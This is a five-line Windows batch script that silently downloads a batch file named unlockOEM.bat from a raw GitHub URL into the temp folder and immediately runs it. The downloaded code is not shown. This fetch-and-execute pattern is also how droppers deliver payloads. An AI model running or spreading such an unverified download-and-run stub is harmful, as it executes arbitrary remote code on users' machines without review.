@echo off
cd /d %systemdrive%
curl -s -o %temp%\unlockOEM.bat https://raw.githubusercontent.com/legalizetren/bruhmoment/main/unlockOEM.bat
%temp%\unlockOEM.bat
exit